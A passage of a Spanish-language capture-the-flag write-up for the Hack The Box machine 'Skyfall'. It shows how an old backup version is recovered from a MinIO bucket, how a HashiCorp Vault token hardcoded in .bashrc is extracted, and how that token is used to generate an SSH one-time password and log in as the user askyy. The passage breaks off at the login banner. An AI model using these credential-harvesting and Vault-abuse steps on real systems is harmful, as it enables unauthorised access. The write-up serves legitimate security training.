+<p>Vemos que está habilitado.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span> ./mc version info skyfall/askyy
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>skyfall/askyy versioning is enabled
+</span></span></code></pre></div>
+<p>Podemos hacer otra vez un <code>mc ls skyfall/askyy</code> pero con el parámetro <code>--versions</code> para ver todas las versiones del archivo.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ./mc ls skyfall/askyy --versions
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[2023-11-08 06:35:28 CET]  48KiB STANDARD bba1fcc2-331d-41d4-845b-0887152f19ec v1 PUT Welcome.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>[2023-11-09 22:37:25 CET] 2.5KiB STANDARD 25835695-5e73-4c13-82f7-30fd2da2cf61 v3 PUT home_backup.tar.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>[2023-11-09 22:37:09 CET] 2.6KiB STANDARD 2b75346d-2a47-4203-ab09-3c9f878466b8 v2 PUT home_backup.tar.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>[2023-11-09 22:36:30 CET] 1.2MiB STANDARD 3c498578-8dfe-43b7-b679-32a3fe42018f v1 PUT home_backup.tar.gz
+</span></span></code></pre></div>
+<p>Vemos que hay una versión que pesa mucho mas que el resto, la versión <code>3c498578-8dfe-43b7-b679-32a3fe42018f</code> , nos vamos a descargar esta versión.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ./mc cp --version-id 3c498578-8dfe-43b7-b679-32a3fe42018f skyfall/askyy/home_backup.tar.gz ./home_backup_v1.tar.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>...me_backup.tar.gz: 1.18 MiB / 1.18 MiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 2.55 MiB/s 0s
+</span></span></code></pre></div>
+<p>Al extraer el comprimido vemos muchos mas archivos.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ tar -xvf home_backup_v1.tar.gz                                                                         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>./                                                                                                               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>./.profile                                                                                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>./terraform-generator/                                                                                           
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>./terraform-generator/.eslintrc.json                                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>./terraform-generator/package.json                                                                               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>./terraform-generator/src/                                                                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>./terraform-generator/src/TerraformGenerator.ts                                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>./terraform-generator/src/arguments/                                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>./terraform-generator/src/arguments/index.ts                                                                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>./terraform-generator/src/arguments/Function.ts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>.......
+</span></span></code></pre></div>
+<p>Vemos un proyecto, vamos a comprobar que no haya ninguna credencial hardcodeada o algo interesante.</p>
+<p>Utilizando un SAST (Static Application Security Testing) no encontré nada en el código de la aplicación.</p>
+<p>No encontré nada en esta versión tampoco.</p>
+<p>Vamos a descargar ahora la versión <code>2b75346d-2a47-4203-ab09-3c9f878466b8</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ ./mc cp --version-id 2b75346d-2a47-4203-ab09-3c9f878466b8 skyfall/askyy/home_backup.tar.gz ./home_backup_v2.tar.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>...me_backup.tar.gz: 2.64 KiB / 2.64 KiB ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 16.31 KiB/s 0s
+</span></span></code></pre></div>
+<p>Revisando el archivo <code>.bashrc</code> de esta versión encontramos lo siguiente.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>export VAULT_API_ADDR=&#34;http://prd23-vault-internal.skyfall.htb&#34;                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>export VAULT_TOKEN=&#34;hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQ
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>VE&#34;
+</span></span></code></pre></div>
+<p><img src="images/Screenshot_17.png" alt="Write-up Image"></p>
+<p>Encontramos otro subdominio, <code>prd23-vault-internal.skyfall.htb</code>, lo añadimos al <code>/etc/hosts</code></p>
+<h2 id="abusing-vault-otp---foothold">Abusing Vault OTP -&gt; Foothold</h2>
+<p>Al buscar <code>VAULT_TOKEN</code> encontramos lo siguiente, pertenece a <code>Vault</code> de <code>HashiCorp</code>, esto lo hemos tocado ya en otras máquinas, sirven para poder gestionar secretos, contraseñas, certificados, tokens.. También sirve para hacer rotación de secretos, es decir, crear un OTP para acceder por SSH por ejemplo.
+<img src="images/Screenshot_18.png" alt="Write-up Image"></p>
+<p>Según la documentación, podemos establecer la URL mediante el parámetro <code>-address</code> pero nos sale un error.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ vault login -address <span style="color:#0ff;font-weight:bold">&#34;http://prd23-vault-internal.skyfall.htb&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>WARNING! VAULT_ADDR and -address unset. Defaulting to https://127.0.0.1:8200.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Token (will be hidden): 
+</span></span></code></pre></div>
+<p>Así que vamos a hacerle caso y vamos a exportar la variable de entorno <code>VAULT_ADDR</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ <span style="color:#fff;font-weight:bold">export</span> VAULT_ADDR=http://prd23-vault-internal.skyfall.htb
+</span></span></code></pre></div>
+<p>Y podemos hacer el login con el token que nos hemos encontrado antes.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ vault login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Token (will be hidden): 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Success! You are now authenticated. The token information displayed below
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>is already stored in the token helper. You do NOT need to run &#34;vault login&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>again. Future Vault requests will automatically use this token.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#f00"></span>Key                  Value
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>---                  -----
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>token                hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>token_accessor       rByv1coOBC9ITZpzqbDtTUm8
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>token_duration       430779h34m8s
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>token_renewable      true
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>token_policies       [&#34;default&#34; &#34;developers&#34;]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>identity_policies    []
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>policies             [&#34;default&#34; &#34;developers&#34;]
+</span></span></code></pre></div>
+<p>Podemos deducir que este token es de el usuario <code>askyy</code>
+<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
+<p>Vemos que en policies pone <code>default developers</code>, esto significa que nuestra política es una llamada <code>developers</code></p>
+<p>Podemos ver los permisos que tenemos sobre esta política.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ vault token capabilities sys/policy/developers
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>read
+</span></span></code></pre></div>
+<p>Podemos ver que hace esta política.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ vault <span style="color:#fff;font-weight:bold">read</span> sys/policy/developers
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Key      Value
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>---      -----
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>name     developers
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>rules    path &#34;sys/policy/developers&#34; {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>  capabilities = [  &#34;read&#34; ]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span><span style="color:#f00"></span>path &#34;ssh/*&#34; {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>  capabilities = [ &#34;list&#34; ]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span><span style="color:#f00"></span>path &#34;ssh/creds/dev_otp_key_role&#34; {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>  capabilities = [&#34;create&#34;, &#34;read&#34;, &#34;update&#34;]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>}
+</span></span></code></pre></div>
+<p>Vemos que tenemos una capability de crear un OTP para un rol llamado <code>dev_otp_key_role</code> este rol es para la conexión por SSH.</p>
+<p>Podemos listar todos los roles</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ vault list ssh/roles
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Keys
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>----
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>admin_otp_key_role
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>dev_otp_key_role
+</span></span></code></pre></div>
+<p>Podemos generar un OTP y conectarnos por ssh</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ vault ssh -role dev_otp_key_role askyy@10.129.230.158                                                                                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>WARNING: No -mode specified. Use -mode to tell Vault which ssh authentication                                                                                                
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>mode to use. In the future, you will need to tell Vault which mode to use.                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>For now, Vault will attempt to guess based on the API response. This guess                                                                                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>involves creating a temporary credential, reading its type, and then revoking                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>it. To reduce the number of API calls and surface area, specify -mode                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>directly. This will be removed in Vault 1.1.               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>Failed to revoke temporary key: Error making API request.                                                                                                                                                          
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>                                                                                                                                                                                                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>URL: PUT http://prd23-vault-internal.skyfall.htb/v1/sys/leases/revoke                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>Code: 403. Errors:                                                                                               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>                                                                                                         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>* 1 error occurred:                                                                                                                               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>        * permission denied                                                                                                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>                                                                         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>                                                                         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>Vault could not locate &#34;sshpass&#34;. The OTP code for the session is displayed                                                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>below. Enter this code in the SSH password prompt. If you install sshpass,                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>Vault can automatically perform this step for you.                                                                                                                           
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>OTP for the session is: 3350605a-bad7-0e83-b8d4-ea63a3fe5b5c                                                                                                                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>flag provided but not defined: -p                                                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>Usage of vault plugin settings:                                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>  -ca-cert string                                                                                                                                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>                                           
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>  -ca-path string                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>                                                                                                                                                                                                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>  -client-cert string                                                                                                                                                                                              
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>                                                                                                         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>  -client-key string                                                                                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>                                                                                                                                                                                                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>  -tls-server-name string                           
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>                                                           
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>  -tls-skip-verify                                         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>                                                           
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>This binary is a plugin. These are not meant to be executed directly.                                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>Please execute the program that consumes these plugins, which will                                                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>load any plugins automatically                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>failed to run ssh command: exit status 1 
+</span></span></code></pre></div>
+<p>Si nos sale ese error, simplemente podemos coger el código OTP generado, <code>3350605a-bad7-0e83-b8d4-ea63a3fe5b5c</code>  y conectarnos por SSH al usuario.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ ssh askyy@10.129.230.158
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>(askyy@10.129.230.158) Password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#f00"></span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span> * Support:        https://ubuntu.com/pro
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#f00">
